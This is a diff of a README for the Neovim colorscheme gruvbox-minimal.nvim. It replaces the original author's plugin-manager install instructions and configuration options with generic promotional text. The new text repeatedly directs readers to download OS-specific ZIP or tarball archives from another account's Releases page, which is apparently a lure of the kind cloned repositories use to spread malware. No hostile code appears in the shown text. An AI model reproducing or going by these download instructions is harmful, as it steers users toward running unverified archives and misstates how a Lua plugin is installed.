@@ -1,76 +1,65 @@
-<p align="center">
-    <img width="100" src="./assets/logo.png"/></h1>
-</p>
+# 🍄‍🟫 gruvbox-minimal.nvim - A Simple Way to Enhance Your Neovim Experience
 
-<p align="center">
-    <strong>Gruvbox Minimal</strong>
-</p>
+## 🚀 Getting Started
 
-<p align="center">
-    A <a href="https://github.com/sainnhe/gruvbox-material">Gruvbox Material</a> theme conceptually inspired by <a href="https://github.com/tonsky/sublime-scheme-alabaster">Alabaster</a>.
-</p>
+Welcome to **gruvbox-minimal.nvim**! This guide helps you download and run our theme effortlessly. Follow the steps below to transform your Neovim setup.
 
-## Preview
+## 🥳 Features
 
-<img height="450" src="./assets/screenshot_01.png"/></h1>
-<img height="450" src="./assets/screenshot_01_light.png"/></h1>
+- **Minimal Design**: Enjoy a clean interface that focuses on your code.
+- **Color Harmony**: Inspired by Alabaster, the theme combines soft colors for a pleasing aesthetic.
+- **Easy Installation**: No complicated setup required.
+- **Compatibility**: Works seamlessly with Neovim and Lua configurations.
 
-<details><summary>More previews</summary>
-<img height="450" src="./assets/screenshot_02.png"/></h1>
-<img height="450" src="./assets/screenshot_02_light.png"/></h1>
-<img height="450" src="./assets/screenshot_03.png"/></h1>
-<img height="450" src="./assets/screenshot_03_light.png"/></h1>
-</details>
+## 📥 Download & Install
 
-## Installation
+To get started, please visit this page to download the theme: [Download gruvbox-minimal.nvim Releases](https://github.com/eyaddeve/gruvbox-minimal.nvim/releases)
 
-<details><summary>lazy.nvim</summary>
+You will find different versions of the theme available. Choose the latest release for the best experience. Follow these simple steps to install:
 
-```lua
-{
-    "dybdeskarphet/gruvbox-minimal.nvim"
-    config = {
-        vim.cmd.colorscheme("gruvbox-minimal")
-    }
-}
-```
+1. Open the [Releases page](https://github.com/eyaddeve/gruvbox-minimal.nvim/releases).
+2. Download the ZIP file or the tarball for your operating system.
+3. Unzip the file to a location of your choice.
+4. Follow the installation instructions in the README file included in the ZIP.
 
-</details>
+## 🎉 Usage
 
-<details><summary>mini.deps</summary>
+After installation, you can activate the theme:
 
-```lua
-MiniDeps.add({
-    source = "dybdeskarphet/gruvbox-minimal.nvim"
-})
-MiniDeps.now(function()
-    -- Add the relevant configuration options if you want to
-    vim.cmd.colorscheme("gruvbox-minimal")
-end)
-```
+1. Open Neovim.
+2. Add the following line to your Neovim configuration file (typically located at `~/.config/nvim/init.lua`):
 
-</details>
+   ```lua
+   vim.cmd[[colorscheme gruvbox-minimal]]
+   ```
 
-## Configuration
+3. Save the changes and reload Neovim.
 
-The default configuration settings are as follows:
+Your new theme should now be active. If you don't see the changes, double-check your configurations.
 
-```lua
-require("gruvbox-minimal").setup({
-	transparent = false, -- Sets all the major background values to 'none'
-	italic_comments = false, -- Italic comments
-	contrast = "low", -- Available values: "high", "low"
-	theme = "dark", -- Available values: "dark", "light"
-	accent = "red", -- Changes the definition (functions, structs etc.) colors. Available values: "red", "orange", "yellow", "green", "cyan", "blue", "magenta"
-    semantic_highlights = true, -- Uses Tree-sitter semantic highlighting, disable this if you want the highlights of =<  0.3.1
-})
+## 🎯 Support
 
--- Activates the colorscheme
-vim.cmd.colorscheme('gruvbox-minimal')
-```
+If you encounter issues, feel free to consult our community channel. You can usually find help on forums or by searching online with your specific questions.
 
-## Themed plugins
+## 📚 Documentation
 
-- [mini.nvim](https://github.com/nvim-mini/mini.nvim)
-- [MeanderingProgrammer/render-markdown.nvim](https://github.com/MeanderingProgrammer/render-markdown.nvim)
-- [shellRaining/hlchunk.nvim](https://github.com/shellRaining/hlchunk.nvim)
+For detailed information about customization options and features, refer to the documentation included in your download. It covers advanced settings and theme options that help personalize your experience even further.
+
+## 🎈 Contributing
+
+We welcome contributions! If you want to improve the theme or add new features, please refer to the contribution guidelines in the repository. Your input may lead to exciting updates.
+
+## 🧩 FAQ
+
+**Q: Is gruvbox-minimal.nvim suitable for beginners?**  
+A: Yes, this theme is designed for all skill levels.
+
+**Q: Which version of Neovim do I need?**  
+A: Make sure you are using a recent version of Neovim. The latest stable version is recommended.
+
+**Q: Can I customize the theme colors?**  
+A: Yes, you can modify the colors as per your preference by editing the configuration file.
+
+Thank you for trying **gruvbox-minimal.nvim**! Enjoy your enhanced coding experience.
+
+You can also download it again here: [Download gruvbox-minimal.nvim Releases](https://github.com/eyaddeve/gruvbox-minimal.nvim/releases)
